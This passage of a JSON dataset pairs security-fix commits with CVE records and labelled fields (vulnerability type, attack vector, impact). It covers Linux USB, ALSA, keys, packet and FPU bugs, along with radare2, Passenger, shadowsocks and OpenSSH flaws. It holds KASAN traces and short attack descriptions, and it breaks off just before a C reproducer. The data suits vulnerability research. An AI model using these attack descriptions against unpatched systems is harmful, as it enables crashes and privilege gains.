drivers\/base\/dd.c:757\n\tbus_probe_device+0x1eb\/0x290 drivers\/base\/bus.c:523\n\tdevice_add+0xd0b\/0x1660 drivers\/base\/core.c:1835\n\tusb_new_device+0x7b8\/0x1020 drivers\/usb\/core\/hub.c:2457\n\thub_port_connect drivers\/usb\/core\/hub.c:4903\n\thub_port_connect_change drivers\/usb\/core\/hub.c:5009\n\tport_event drivers\/usb\/core\/hub.c:5115\n\thub_event+0x194d\/0x3740 drivers\/usb\/core\/hub.c:5195\n\tprocess_one_work+0xc7f\/0x1db0 kernel\/workqueue.c:2119\n\tworker_thread+0x221\/0x1850 kernel\/workqueue.c:2253\n\tkthread+0x3a1\/0x470 kernel\/kthread.c:231\n\tret_from_fork+0x2a\/0x40 arch\/x86\/entry\/entry_64.S:431\n\nCc: stable@vger.kernel.org\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Jaejoong Kim <climbbb.kim@gmail.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nAcked-by: Alan Stern <stern@rowland.harvard.edu>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"The usbhid_parse function in drivers\/hid\/usbhid\/hid-core.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"usbhid : fix out-of-bounds bug the hid descriptor identifies the length and type of subordinate descriptor for a device","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"bd7a3fe770ebd8391d1c7d072ff88e9e76d063eb","cve_id":"CVE-2017-16531","cwe_id":"CWE-119","commit_message":"USB: fix out-of-bounds in usb_set_configuration\n\nAndrey Konovalov reported a possible out-of-bounds problem for a USB interface\nassociation descriptor.  He writes:\n\tIt seems there's no proper size check of a USB_DT_INTERFACE_ASSOCIATION\n\tdescriptor. It's only checked that the size is >= 2 in\n\tusb_parse_configuration(), so find_iad() might do out-of-bounds access\n\tto intf_assoc->bInterfaceCount.\n\nAnd he's right, we don't check for crazy descriptors of this type very well, so\nresolve this problem.  Yet another issue found by syzkaller...\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/usb\/core\/config.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device, related to the USB_DT_INTERFACE_ASSOCIATION descriptor.","commit_message_1":"fix out-of-bounds in usb_set_configuration andrey konovalov reported a possible out-of-bounds problem for a usb interface association descriptor","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted usb device , related to the usb _ dt _ interface _ association descriptor","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"786de92b3cb26012d3d0f00ee37adf14527f35c4","cve_id":"CVE-2017-16530","cwe_id":"CWE-125","commit_message":"USB: uas: fix bug in handling of alternate settings\n\nThe uas driver has a subtle bug in the way it handles alternate\nsettings.  The uas_find_uas_alt_setting() routine returns an\naltsetting value (the bAlternateSetting number in the descriptor), but\nuas_use_uas_driver() then treats that value as an index to the\nintf->altsetting array, which it isn't.\n\nNormally this doesn't cause any problems because the various\nalternate settings have bAlternateSetting values 0, 1, 2, ..., so the\nvalue is equal to the index in the array.  But this is not guaranteed,\nand Andrey Konovalov used the syzkaller fuzzer with KASAN to get a\nslab-out-of-bounds error by violating this assumption.\n\nThis patch fixes the bug by making uas_find_uas_alt_setting() return a\npointer to the altsetting entry rather than either the value or the\nindex.  Pointers are less subject to misinterpretation.\n\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCC: Oliver Neukum <oneukum@suse.com>\nCC: <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The uas driver in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device, related to drivers\/usb\/storage\/uas-detect.h and drivers\/usb\/storage\/uas.c.","commit_message_1":"uas : fix bug in handling of alternate setting the uas driver ha a subtle bug in the way it handle alternate setting","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted usb device , related to drivers \/ usb \/ storage \/ uas - detect . h and drivers \/ usb \/ storage \/ uas . c","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"bfc81a8bc18e3c4ba0cbaa7666ff76be2f998991","cve_id":"CVE-2017-16529","cwe_id":"CWE-125","commit_message":"ALSA: usb-audio: Check out-of-bounds access by corrupted buffer descriptor\n\nWhen a USB-audio device receives a maliciously adjusted or corrupted\nbuffer descriptor, the USB-audio driver may access an out-of-bounce\nvalue at its parser.  This was detected by syzkaller, something like:\n\n  BUG: KASAN: slab-out-of-bounds in usb_audio_probe+0x27b2\/0x2ab0\n  Read of size 1 at addr ffff88006b83a9e8 by task kworker\/0:1\/24\n  CPU: 0 PID: 24 Comm: kworker\/0:1 Not tainted 4.14.0-rc1-42251-gebb2c2437d80 #224\n  Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n  Workqueue: usb_hub_wq hub_event\n  Call Trace:\n   __dump_stack lib\/dump_stack.c:16\n   dump_stack+0x292\/0x395 lib\/dump_stack.c:52\n   print_address_description+0x78\/0x280 mm\/kasan\/report.c:252\n   kasan_report_error mm\/kasan\/report.c:351\n   kasan_report+0x22f\/0x340 mm\/kasan\/report.c:409\n   __asan_report_load1_noabort+0x19\/0x20 mm\/kasan\/report.c:427\n   snd_usb_create_streams sound\/usb\/card.c:248\n   usb_audio_probe+0x27b2\/0x2ab0 sound\/usb\/card.c:605\n   usb_probe_interface+0x35d\/0x8e0 drivers\/usb\/core\/driver.c:361\n   really_probe drivers\/base\/dd.c:413\n   driver_probe_device+0x610\/0xa00 drivers\/base\/dd.c:557\n   __device_attach_driver+0x230\/0x290 drivers\/base\/dd.c:653\n   bus_for_each_drv+0x161\/0x210 drivers\/base\/bus.c:463\n   __device_attach+0x26e\/0x3d0 drivers\/base\/dd.c:710\n   device_initial_probe+0x1f\/0x30 drivers\/base\/dd.c:757\n   bus_probe_device+0x1eb\/0x290 drivers\/base\/bus.c:523\n   device_add+0xd0b\/0x1660 drivers\/base\/core.c:1835\n   usb_set_configuration+0x104e\/0x1870 drivers\/usb\/core\/message.c:1932\n   generic_probe+0x73\/0xe0 drivers\/usb\/core\/generic.c:174\n   usb_probe_device+0xaf\/0xe0 drivers\/usb\/core\/driver.c:266\n   really_probe drivers\/base\/dd.c:413\n   driver_probe_device+0x610\/0xa00 drivers\/base\/dd.c:557\n   __device_attach_driver+0x230\/0x290 drivers\/base\/dd.c:653\n   bus_for_each_drv+0x161\/0x210 drivers\/base\/bus.c:463\n   __device_attach+0x26e\/0x3d0 drivers\/base\/dd.c:710\n   device_initial_probe+0x1f\/0x30 drivers\/base\/dd.c:757\n   bus_probe_device+0x1eb\/0x290 drivers\/base\/bus.c:523\n   device_add+0xd0b\/0x1660 drivers\/base\/core.c:1835\n   usb_new_device+0x7b8\/0x1020 drivers\/usb\/core\/hub.c:2457\n   hub_port_connect drivers\/usb\/core\/hub.c:4903\n   hub_port_connect_change drivers\/usb\/core\/hub.c:5009\n   port_event drivers\/usb\/core\/hub.c:5115\n   hub_event+0x194d\/0x3740 drivers\/usb\/core\/hub.c:5195\n   process_one_work+0xc7f\/0x1db0 kernel\/workqueue.c:2119\n   worker_thread+0x221\/0x1850 kernel\/workqueue.c:2253\n   kthread+0x3a1\/0x470 kernel\/kthread.c:231\n   ret_from_fork+0x2a\/0x40 arch\/x86\/entry\/entry_64.S:431\n\nThis patch adds the checks of out-of-bounce accesses at appropriate\nplaces and bails out when it goes out of the given buffer.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_usb_create_streams function in sound\/usb\/card.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"usb-audio : check out-of-bounds access by corrupted buffer descriptor when a usb-audio device receives a maliciously adjusted or corrupted buffer descriptor , the usb-audio driver may access an out-of-bounce value at it parser","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"fc27fe7e8deef2f37cba3f2be2d52b6ca5eb9d57","cve_id":"CVE-2017-16528","cwe_id":"CWE-416","commit_message":"ALSA: seq: Cancel pending autoload work at unbinding device\n\nALSA sequencer core has a mechanism to load the enumerated devices\nautomatically, and it's performed in an off-load work.  This seems\ncausing some race when a sequencer is removed while the pending\nautoload work is running.  As syzkaller spotted, it may lead to some\nuse-after-free:\n  BUG: KASAN: use-after-free in snd_rawmidi_dev_seq_free+0x69\/0x70\n  sound\/core\/rawmidi.c:1617\n  Write of size 8 at addr ffff88006c611d90 by task kworker\/2:1\/567\n\n  CPU: 2 PID: 567 Comm: kworker\/2:1 Not tainted 4.13.0+ #29\n  Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n  Workqueue: events autoload_drivers\n  Call Trace:\n   __dump_stack lib\/dump_stack.c:16 [inline]\n   dump_stack+0x192\/0x22c lib\/dump_stack.c:52\n   print_address_description+0x78\/0x280 mm\/kasan\/report.c:252\n   kasan_report_error mm\/kasan\/report.c:351 [inline]\n   kasan_report+0x230\/0x340 mm\/kasan\/report.c:409\n   __asan_report_store8_noabort+0x1c\/0x20 mm\/kasan\/report.c:435\n   snd_rawmidi_dev_seq_free+0x69\/0x70 sound\/core\/rawmidi.c:1617\n   snd_seq_dev_release+0x4f\/0x70 sound\/core\/seq_device.c:192\n   device_release+0x13f\/0x210 drivers\/base\/core.c:814\n   kobject_cleanup lib\/kobject.c:648 [inline]\n   kobject_release lib\/kobject.c:677 [inline]\n   kref_put include\/linux\/kref.h:70 [inline]\n   kobject_put+0x145\/0x240 lib\/kobject.c:694\n   put_device+0x25\/0x30 drivers\/base\/core.c:1799\n   klist_devices_put+0x36\/0x40 drivers\/base\/bus.c:827\n   klist_next+0x264\/0x4a0 lib\/klist.c:403\n   next_device drivers\/base\/bus.c:270 [inline]\n   bus_for_each_dev+0x17e\/0x210 drivers\/base\/bus.c:312\n   autoload_drivers+0x3b\/0x50 sound\/core\/seq_device.c:117\n   process_one_work+0x9fb\/0x1570 kernel\/workqueue.c:2097\n   worker_thread+0x1e4\/0x1350 kernel\/workqueue.c:2231\n   kthread+0x324\/0x3f0 kernel\/kthread.c:231\n   ret_from_fork+0x25\/0x30 arch\/x86\/entry\/entry_64.S:425\n\nThe fix is simply to assure canceling the autoload work at removing\nthe device.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/seq_device.c in the Linux kernel before 4.13.4 allows local users to cause a denial of service (snd_rawmidi_dev_seq_free use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"seq : cancel pending autoload work at unbinding device alsa sequencer core ha a mechanism to load the enumerated device automatically , and it 's performed in an off-load work","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( snd _ rawmidi _ dev _ seq _ free use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"124751d5e63c823092060074bd0abaae61aaa9c4","cve_id":"CVE-2017-16527","cwe_id":"CWE-416","commit_message":"ALSA: usb-audio: Kill stray URB at exiting\n\nUSB-audio driver may leave a stray URB for the mixer interrupt when it\nexits by some error during probe.  This leads to a use-after-free\nerror as spotted by syzkaller like:\n  ==================================================================\n  BUG: KASAN: use-after-free in snd_usb_mixer_interrupt+0x604\/0x6f0\n  Call Trace:\n   <IRQ>\n   __dump_stack lib\/dump_stack.c:16\n   dump_stack+0x292\/0x395 lib\/dump_stack.c:52\n   print_address_description+0x78\/0x280 mm\/kasan\/report.c:252\n   kasan_report_error mm\/kasan\/report.c:351\n   kasan_report+0x23d\/0x350 mm\/kasan\/report.c:409\n   __asan_report_load8_noabort+0x19\/0x20 mm\/kasan\/report.c:430\n   snd_usb_mixer_interrupt+0x604\/0x6f0 sound\/usb\/mixer.c:2490\n   __usb_hcd_giveback_urb+0x2e0\/0x650 drivers\/usb\/core\/hcd.c:1779\n   ....\n\n  Allocated by task 1484:\n   save_stack_trace+0x1b\/0x20 arch\/x86\/kernel\/stacktrace.c:59\n   save_stack+0x43\/0xd0 mm\/kasan\/kasan.c:447\n   set_track mm\/kasan\/kasan.c:459\n   kasan_kmalloc+0xad\/0xe0 mm\/kasan\/kasan.c:551\n   kmem_cache_alloc_trace+0x11e\/0x2d0 mm\/slub.c:2772\n   kmalloc .\/include\/linux\/slab.h:493\n   kzalloc .\/include\/linux\/slab.h:666\n   snd_usb_create_mixer+0x145\/0x1010 sound\/usb\/mixer.c:2540\n   create_standard_mixer_quirk+0x58\/0x80 sound\/usb\/quirks.c:516\n   snd_usb_create_quirk+0x92\/0x100 sound\/usb\/quirks.c:560\n   create_composite_quirk+0x1c4\/0x3e0 sound\/usb\/quirks.c:59\n   snd_usb_create_quirk+0x92\/0x100 sound\/usb\/quirks.c:560\n   usb_audio_probe+0x1040\/0x2c10 sound\/usb\/card.c:618\n   ....\n\n  Freed by task 1484:\n   save_stack_trace+0x1b\/0x20 arch\/x86\/kernel\/stacktrace.c:59\n   save_stack+0x43\/0xd0 mm\/kasan\/kasan.c:447\n   set_track mm\/kasan\/kasan.c:459\n   kasan_slab_free+0x72\/0xc0 mm\/kasan\/kasan.c:524\n   slab_free_hook mm\/slub.c:1390\n   slab_free_freelist_hook mm\/slub.c:1412\n   slab_free mm\/slub.c:2988\n   kfree+0xf6\/0x2f0 mm\/slub.c:3919\n   snd_usb_mixer_free+0x11a\/0x160 sound\/usb\/mixer.c:2244\n   snd_usb_mixer_dev_free+0x36\/0x50 sound\/usb\/mixer.c:2250\n   __snd_device_free+0x1ff\/0x380 sound\/core\/device.c:91\n   snd_device_free_all+0x8f\/0xe0 sound\/core\/device.c:244\n   snd_card_do_free sound\/core\/init.c:461\n   release_card_device+0x47\/0x170 sound\/core\/init.c:181\n   device_release+0x13f\/0x210 drivers\/base\/core.c:814\n   ....\n\nActually such a URB is killed properly at disconnection when the\ndevice gets probed successfully, and what we need is to apply it for\nthe error-path, too.\n\nIn this patch, we apply snd_usb_mixer_disconnect() at releasing.\nAlso introduce a new flag, disconnected, to struct usb_mixer_interface\nfor not performing the disconnection procedure twice.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/usb\/mixer.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (snd_usb_mixer_interrupt use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"usb-audio : kill stray urb at exiting usb-audio driver may leave a stray urb for the mixer interrupt when it exit by some error during probe","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( snd _ usb _ mixer _ interrupt use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"bbf26183b7a6236ba602f4d6a2f7cade35bba043","cve_id":"CVE-2017-16526","cwe_id":"CWE-119","commit_message":"uwb: properly check kthread_run return value\n\nuwbd_start() calls kthread_run() and checks that the return value is\nnot NULL. But the return value is not NULL in case kthread_run() fails,\nit takes the form of ERR_PTR(-EINTR).\n\nUse IS_ERR() instead.\n\nAlso add a check to uwbd_stop().\n\nSigned-off-by: Andrey Konovalov <andreyknvl@google.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/uwb\/uwbd.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (general protection fault and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"properly check kthread_run return value uwbd_start ( ) call kthread_run ( ) and check that the return value is not null","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( general protection fault and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"299d7572e46f98534033a9e65973f13ad1ce9047","cve_id":"CVE-2017-16525","cwe_id":"CWE-416","commit_message":"USB: serial: console: fix use-after-free after failed setup\n\nMake sure to reset the USB-console port pointer when console setup fails\nin order to avoid having the struct usb_serial be prematurely freed by\nthe console code when the device is later disconnected.\n\nFixes: 73e487fdb75f (\"[PATCH] USB console: fix disconnection issues\")\nCc: stable <stable@vger.kernel.org>\t# 2.6.18\nAcked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The usb_serial_console_disconnect function in drivers\/usb\/serial\/console.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device, related to disconnection and failed setup.","commit_message_1":"serial : console : fix use-after-free after failed setup make sure to reset the usb-console port pointer when console setup fails in order to avoid having the struct usb_serial be prematurely freed by the console code when the device is later disconnected","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"d31c4d3cbdbe01ea3ded16a584de94149ecd31d9","cve_id":"CVE-2017-16358","cwe_id":"CWE-125","commit_message":"Fix #8748 - Fix oobread on string search","summary":"In radare 2.0.1, an out-of-bounds read vulnerability exists in string_scan_range() in libr\/bin\/bin.c when doing a string search.","commit_message_1":"fix # <number> - fix oobread on string search","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"4043718264095cde6623c2cbe8c644541036d7bf","cve_id":"CVE-2017-16355","cwe_id":"CWE-200","commit_message":"Disable unused feature.","summary":"In agent\/Core\/SpawningKit\/Spawner.h in Phusion Passenger 5.1.10 (fixed in Passenger Open Source 5.1.11 and Passenger Enterprise 5.1.10), if Passenger is running as root, it is possible to list the contents of arbitrary files on a system by symlinking a file named REVISION from the application root folder to a file of choice and querying passenger-status --show=xml.","commit_message_1":"disable unused feature","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by symlinking a file named revision from the application root folder to a file of choice and querying passenger - status - - show = xml .","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"363b02dab09b3226f3bd1420dad9c72b79a42a76","cve_id":"CVE-2017-15951","cwe_id":"CWE-20","commit_message":"KEYS: Fix race between updating and finding a negative key\n\nConsolidate KEY_FLAG_INSTANTIATED, KEY_FLAG_NEGATIVE and the rejection\nerror into one field such that:\n\n (1) The instantiation state can be modified\/read atomically.\n\n (2) The error can be accessed atomically with the state.\n\n (3) The error isn't stored unioned with the payload pointers.\n\nThis deals with the problem that the state is spread over three different\nobjects (two bits and a separate variable) and reading or updating them\natomically isn't practical, given that not only can uninstantiated keys\nchange into instantiated or rejected keys, but rejected keys can also turn\ninto instantiated keys - and someone accessing the key might not be using\nany locking.\n\nThe main side effect of this problem is that what was held in the payload\nmay change, depending on the state.  For instance, you might observe the\nkey to be in the rejected state.  You then read the cached error, but if\nthe key semaphore wasn't locked, the key might've become instantiated\nbetween the two reads - and you might now have something in hand that isn't\nactually an error code.\n\nThe state is now KEY_IS_UNINSTANTIATED, KEY_IS_POSITIVE or a negative error\ncode if the key is negatively instantiated.  The key_is_instantiated()\nfunction is replaced with key_is_positive() to avoid confusion as negative\nkeys are also 'instantiated'.\n\nAdditionally, barriering is included:\n\n (1) Order payload-set before state-set during instantiation.\n\n (2) Order state-read before payload-read when using the key.\n\nFurther separate barriering is necessary if RCU is being used to access the\npayload content after reading the payload pointers.\n\nFixes: 146aa8b1453b (\"KEYS: Merge the type-specific data with the payload data\")\nCc: stable@vger.kernel.org # v4.4+\nReported-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nReviewed-by: Eric Biggers <ebiggers@google.com>","summary":"The KEYS subsystem in the Linux kernel before 4.13.10 does not correctly synchronize the actions of updating versus finding a key in the *negative* state to avoid a race condition, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls.","commit_message_1":"fix race between updating and finding a negative key consolidate key_flag_instantiated , key_flag_negative and the rejection error into one field such that : ( <number> ) the instantiation state can be modified\/read atomically","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted system calls","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not correctly synchronize the actions of updating versus finding a key","Attack Type":"local attacker"},{"commit_id":"44ded3ff35b8264f54b5a900cab32ec489d9e5b9","cve_id":"CVE-2017-15932","cwe_id":"CWE-125","commit_message":"Fix #8743 - Crash in ELF version parser on 32bit systems","summary":"In radare2 2.0.1, an integer exception (negative number leading to an invalid memory access) exists in store_versioninfo_gnu_verdef() in libr\/bin\/format\/elf\/elf.c via crafted ELF files when parsing the ELF version on 32bit systems.","commit_message_1":"fix # <number> - crash in elf version parser on 32bit system","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted ELF file","Impact":"cause a denial of service","Root Cause":"caused by an invalid memory access flaw","Attack Type":"remote attacker"},{"commit_id":"c6d0076c924891ad9948a62d89d0bcdaf965f0cd","cve_id":"CVE-2017-15931","cwe_id":"CWE-125","commit_message":"Fix #8731 - Crash in ELF parser with negative 32bit number","summary":"In radare2 2.0.1, an integer exception (negative number leading to an invalid memory access) exists in store_versioninfo_gnu_verneed() in libr\/bin\/format\/elf\/elf.c via crafted ELF files on 32bit systems.","commit_message_1":"fix # <number> - crash in elf parser with negative 32bit number","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted ELF file","Impact":"cause a denial of service","Root Cause":"caused by an invalid memory access flaw","Attack Type":"remote attacker"},{"commit_id":"c67d275803dc6ea22c558d06b1f7ba9f94cd8de3","cve_id":"CVE-2017-15924","cwe_id":"CWE-78","commit_message":"Fix #1734","summary":"In manager.c in ss-manager in shadowsocks-libev 3.1.0, improper parsing allows command injection via shell metacharacters in a JSON configuration request received via 127.0.0.1 UDP traffic, related to the add_server, build_config, and construct_command_line functions.","commit_message_1":"fix # <number>","Vulnerability Type":"command injection","Attack Vector":"via shell metacharacters in a JSON configuration request received","Impact":"execute arbitrary commands","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"a6981567e8e215acc1ef690c8dbb30f2d9b00a19","cve_id":"CVE-2017-15906","cwe_id":"CWE-269","commit_message":"disallow creation (of empty files) in read-only mode; reported by\nMichal Zalewski, feedback & ok deraadt@","summary":"The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.","commit_message_1":"disallow creation ( of empty file ) in read-only mode ; reported by","Vulnerability Type":"Improper Privilege Management","Attack Vector":"does not properly prevent write operations in readonly mode","Impact":"create zero-length files and cause a denial of service","Root Cause":"does not properly prevent write operations","Attack Type":"remote attacker"},{"commit_id":"71bb99a02b32b4cc4265118e85f6035ca72923f0","cve_id":"CVE-2017-15868","cwe_id":"CWE-20","commit_message":"Bluetooth: bnep: bnep_add_connection() should verify that it's dealing with l2cap socket\n\nsame story as cmtp\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>","summary":"The bnep_add_connection function in net\/bluetooth\/bnep\/core.c in the Linux kernel before 3.19 does not ensure that an l2cap socket is available, which allows local users to gain privileges via a crafted application.","commit_message_1":"bnep : bnep_add_connection ( ) should verify that it 's dealing with l2cap socket same story a cmtp","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"gain privileges","Root Cause":"does not ensure that an l2cap socket is available","Attack Type":"local attacker"},{"commit_id":"4971613c1639d8e5f102c4e797c3bf8f83a5a69e","cve_id":"CVE-2017-15649","cwe_id":"CWE-362","commit_message":"packet: in packet_do_bind, test fanout with bind_lock held\n\nOnce a socket has po->fanout set, it remains a member of the group\nuntil it is destroyed. The prot_hook must be constant and identical\nacross sockets in the group.\n\nIf fanout_add races with packet_do_bind between the test of po->fanout\nand taking the lock, the bind call may make type or dev inconsistent\nwith that of the fanout group.\n\nHold po->bind_lock when testing po->fanout to avoid this race.\n\nI had to introduce artificial delay (local_bh_enable) to actually\nobserve the race.\n\nFixes: dc99f600698d (\"packet: Add fanout support.\")\nSigned-off-by: Willem de Bruijn <willemb@google.com>\nReviewed-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/packet\/af_packet.c in the Linux kernel before 4.13.6 allows local users to gain privileges via crafted system calls that trigger mishandling of packet_fanout data structures, because of a race condition (involving fanout_add and packet_do_bind) that leads to a use-after-free, a different vulnerability than CVE-2017-6346.","commit_message_1":"in packet_do_bind , test fanout with bind_lock held once a socket ha po- > fanout set , it remains a member of the group until it is destroyed","Vulnerability Type":"Race Condition","Attack Vector":"via crafted system calls that trigger mishandling of packet _ fanout data structures , because of a race condition ( involving fanout _ add and packet _ do _ bind ) that leads to a use - after - free , a different vulnerability than cve - 2017 - 6346","Impact":"gain privileges","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"814fb7bb7db5433757d76f4c4502c96fc53b0b5e","cve_id":"CVE-2017-15537","cwe_id":"CWE-200","commit_message":"x86\/fpu: Don't let userspace set bogus xcomp_bv\n\nOn x86, userspace can use the ptrace() or rt_sigreturn() system calls to\nset a task's extended state (xstate) or \"FPU\" registers.  ptrace() can\nset them for another task using the PTRACE_SETREGSET request with\nNT_X86_XSTATE, while rt_sigreturn() can set them for the current task.\nIn either case, registers can be set to any value, but the kernel\nassumes that the XSAVE area itself remains valid in the sense that the\nCPU can restore it.\n\nHowever, in the case where the kernel is using the uncompacted xstate\nformat (which it does whenever the XSAVES instruction is unavailable),\nit was possible for userspace to set the xcomp_bv field in the\nxstate_header to an arbitrary value.  However, all bits in that field\nare reserved in the uncompacted case, so when switching to a task with\nnonzero xcomp_bv, the XRSTOR instruction failed with a #GP fault.  This\ncaused the WARN_ON_FPU(err) in copy_kernel_to_xregs() to be hit.  In\naddition, since the error is otherwise ignored, the FPU registers from\nthe task previously executing on the CPU were leaked.\n\nFix the bug by checking that the user-supplied value of xcomp_bv is 0 in\nthe uncompacted case, and returning an error otherwise.\n\nThe reason for validating xcomp_bv rather than simply overwriting it\nwith 0 is that we want userspace to see an error if it (incorrectly)\nprovides an XSAVE area in compacted format rather than in uncompacted\nformat.\n\nNote that as before, in case of error we clear the task's FPU state.\nThis is perhaps non-ideal, especially for PTRACE_SETREGSET; it might be\nbetter to return an error before changing anything.  But it seems the\n\"clear on error\" behavior is fine for now, and it's a little tricky to\ndo otherwise because it would mean we couldn't simply copy the full\nuserspace state into kernel memory in one __copy_from_user().\n\nThis bug was found by syzkaller, which hit the above-mentioned\nWARN_ON_FPU():\n\n    WARNING: CPU: 1 PID: 0 at .\/arch\/x86\/include\/asm\/fpu\/internal.h:373 __switch_to+0x5b5\/0x5d0\n    CPU: 1 PID: 0 Comm: swapper\/1 Not tainted 4.13.0 #453\n    Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n    task: ffff9ba2bc8e42c0 task.stack: ffffa78cc036c000\n    RIP: 0010:__switch_to+0x5b5\/0x5d0\n    RSP: 0000:ffffa78cc08bbb88 EFLAGS: 00010082\n    RAX: 00000000fffffffe RBX: ffff9ba2b8bf2180 RCX: 00000000c0000100\n    RDX: 00000000ffffffff RSI: 000000005cb10700 RDI: ffff9ba2b8bf36c0\n    RBP: ffffa78cc08bbbd0 R08: 00000000929fdf46 R09: 0000000000000001\n    R10: 0000000000000000 R11: 0000000000000000 R12: ffff9ba2bc8e42c0\n    R13: 0000000000000000 R14: ffff9ba2b8bf3680 R15: ffff9ba2bf5d7b40\n    FS:  00007f7e5cb10700(0000) GS:ffff9ba2bf400000(0000) knlGS:0000000000000000\n    CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n    CR2: 00000000004005cc CR3: 0000000079fd5000 CR4: 00000000001406e0\n    Call Trace:\n    Code: 84 00 00 00 00 00 e9 11 fd ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 e7 fa ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 c2 fa ff ff <0f> ff 66 0f 1f 84 00 00 00 00 00 e9 d4 fc ff ff 66 66 2e 0f 1f\n\nHere is a C reproducer.  The expected behavior is that the program spin\nforever with no output.  